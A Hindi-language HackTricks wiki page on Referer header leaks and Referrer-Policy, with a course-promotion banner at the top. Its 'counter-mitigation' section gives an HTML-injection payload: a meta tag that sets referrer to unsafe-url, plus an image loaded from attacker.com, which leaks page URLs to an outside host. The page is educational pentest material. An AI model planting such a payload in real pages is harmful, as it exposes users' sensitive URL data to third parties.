{% hint style="success" %}
सीखें और प्रैक्टिस करें AWS हैकिंग: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम एक्सपर्ट (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
सीखें और प्रैक्टिस करें GCP हैकिंग: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम एक्सपर्ट (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स** और [**हैकट्रिक्स क्लाउड**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PRs सबमिट करके।

</details>
{% endhint %}

# रेफरर हेडर्स और नीति

रेफरर वह हेडर है जिसका उपयोग ब्राउज़र्स द्वारा किया जाता है ताकि पहले दौरे गए पृष्ठ का पता लगाया जा सके।

## संवेदनशील जानकारी लीक हो गई

यदि किसी वेब पृष्ठ के अंदर किसी GET अनुरोध पैरामीटर पर कोई संवेदनशील जानकारी होती है, यदि पृष्ठ में बाहरी स्रोतों के लिंक होते हैं या एक हमलावर को यह सुझाने या बनाने में सक्षम होता है (सामाजिक इंजीनियरिंग) कि उपयोगकर्ता एक हमलावर द्वारा नियंत्रित URL पर जाएं। तो वह संवेदनशील जानकारी को नवीनतम GET अनुरोध के अंदर निकाल सकता है।

## संशोधन

आप ब्राउज़र को एक **रेफरर-नीति** का पालन करने के लिए कर सकते हैं जो संवेदनशील जानकारी को अन्य वेब एप्लिकेशनों को भेजने से **बचा** सकता है।
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## काउंटर-मिटिगेशन

आप एक HTML मेटा टैग का उपयोग करके इस नियम को नष्ट कर सकते हैं (हमलावर को HTML इन्जेक्शन का शिकार होना चाहिए):
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## रक्षा

कभी भी URL में GET पैरामीटर या पथ में कोई भी संवेदनशील डेटा न डालें।
